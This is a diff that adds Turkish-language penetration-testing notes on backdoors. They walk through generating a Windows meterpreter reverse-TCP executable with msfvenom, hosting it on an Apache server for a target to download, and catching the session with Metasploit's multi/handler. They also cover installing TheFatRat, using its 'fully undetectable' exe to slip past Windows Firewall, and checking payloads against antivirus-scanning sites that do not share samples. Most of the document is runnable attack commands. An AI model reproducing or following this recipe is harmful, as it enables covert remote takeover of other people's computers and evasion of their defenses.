@@ -1,0 +1,122 @@
+
+------------------------
+
+	BACKDOOR
+
+* Bir bilgisayar sistemine, ağ cihazına veya yazılıma gizli bir şekilde erişim sağlamak için oluşturulmuş bir yöntemdir. 
+Bu yöntem, genellikle sistemin normal güvenlik önlemlerini atlatır ve bir saldırganın veya kullanıcının hedef sisteme yetkisiz bir 
+şekilde erişmesini sağlar.
+
+* Backdoor oluşturmak için kullanılan pek çok yöntem vardır. Hazır araçlar kullanılabilir. Kişinin kendisi bir araç yazabilir.
+
+* Backdoor araçları : (Ücretsiz)
+	- Veil Framework
+	- Msfvenom (Güncel)
+	- Unicorn
+	- Venom
+	- FatRat (Güncel)
+	- Empire Project
+	- ...
+
+* Backdoor araçları : (Ücretli)
+	- Cobalt Strike	-> Profesyonel bir şekilde oluşturuyor
+
+------------------------
+
+	BACKDOOR KONTROL
+
+* Oluşturduğumuz backdoor'un antivirüsler tarafından yakalnıp yakalanmayacağını kontrol etmek için kullanabileceğimizi siteler var.
+	- antiscan.Me
+	- nodistribute.com
+
+------------------------
+
+	VEIL FRAMEWORK
+
+* Backdoor oluşturmak için kullanılan bir araçtır. Ancak 2024 yılından itibaren geliştirilmeme kararı alınmıştır. 
+Bir süre sonra güncelliğini yetirecektir.
+
+* https://github.com/Veil-Framework/Veil
+	- Aracın github adresi
+
+------------------------
+
+	MSFVENOM
+
+* msfvenom --list payload
+	- Tool içerisindeki payload'ları listeler. 
+	- Listelenen Tooların İsimlendirilimesi -> Payload_Platform/payload_Type/payload_Protokol
+
+* msfvenom --payload windows/
+	- Windows ile alakalı olan payload'ları listeler
+
+* msfvenom --payload windows/meterpreter_reverse_tcp --list-options 
+	- Seçili payload'lar için seçenekleri görüyoruz
+	- Opsiyonlar içerisinde genelde basic başlığı altındakileri değiştiriyoruz
+	- Advenced altındakile bilmeden dokunmak payload'ın düzgün çalışmasını bozabilir. 
+
+* msfvenom --payload windows/meterpreter_reverse_tcp LHOST=10.0.2.4 LPORT=8080 --format exe --out firstbakdorr.exe
+	- Belirlediğimiz payload ve ayarlamaları üzerinden bir exe dosyası oluşturuyoruz.
+	- karşı taraf bu exe dosyasına tıkladığında bizim pc ile iletişime geçmesi için bir backdorr çalıştırmış olur. 
+
+* Kullanıcıların bu bağlantıya tıklamasını sağlamak için Kali'nin içerisinde var olan web sunucusunu kullanacağız
+	- Exe dosyamızı "/var/www/html/<Klasör Oluştur>/" bu yola yapıştırıyoruz
+	- service apache2 start : Komutu ile web sunucusunu başlatıyoruz
+
+* Kullanıcı exe'yi çalıştırdığında bu bağlantıyı kendi pc'imizden dinlemek için msfconsole kullanacağız
+
+* msfconsole
+	- Konsolumuzu çalıştırıyoruz
+
+* use exploit/multi/handler
+	- Buranın içerisinden bizim exe dosyamıza göre options'ları değiştirebiliyoruz
+
+* set payload  windows/meterprater/reverce_tcp
+	- oluşturduğumuz payloada göre buradan da payload'ı değiştiriyoruz
+
+* Ayrıca LHoST ve LPORT'ları da değiştirmeyi unutmamak lazım
+
+* Karşı makinadaki payload'ımızı (backdoor'umuzu) dinlemye başlamak için
+	- exploit -j -z
+	- sessions <id>
+
+* İÇERDEYİZ!!!!
+
+------------------------
+
+	FATRAT 
+
+* https://github.com/screetsec/TheFatRat.git adresinden FatRat kodunu /opt yoluna kopyalıyoruz
+
+* /opt/TheFatRat içerisindeki setup.sh dosyasını çalıştıracağız
+	- bash setup.sh
+	- Kurulum başlayacaktı.
+
+* fatrat
+	- Tool açılacaktır.
+
+* Tool açıldığında gözüken seçenekler üzerinden dilendiği gibi işlemler yapılabilir.
+
+* Fatrat ile oluşturduğumuz exe dosyaları "/kali/Fatrat_Generated" içerisindeki klasöre kaydediliyor.
+
+* Oluşturduğumuz exe dosyasını web sunucusunun içerisine ekliyoruz.
+
+* Yakalanmaması için daha yavaş oluşturmuş olduğu dosyayı kullanıyoruz.
+	- Windows'un firewall'ına takılmadı
+	- Powerfull-fud.exe
+
+* Windows'ta exeyi çalıştırdıktan sonra uygulama kapatılıyor gibi bir hata alabilirsiniz.
+	- Bu hata backdoor'un oluşturulmasına engel değil
+	- Metasploit üzerinden exploiti çalıştırdığınızda session oluşacaktır 
+
+------------------------
+
+	FATRAT HATASI
+
+* cd /usr/share/metasploit-framework
+* gem install bundler
+* bundle install
+* gem update --systems
+
+------------------------
+
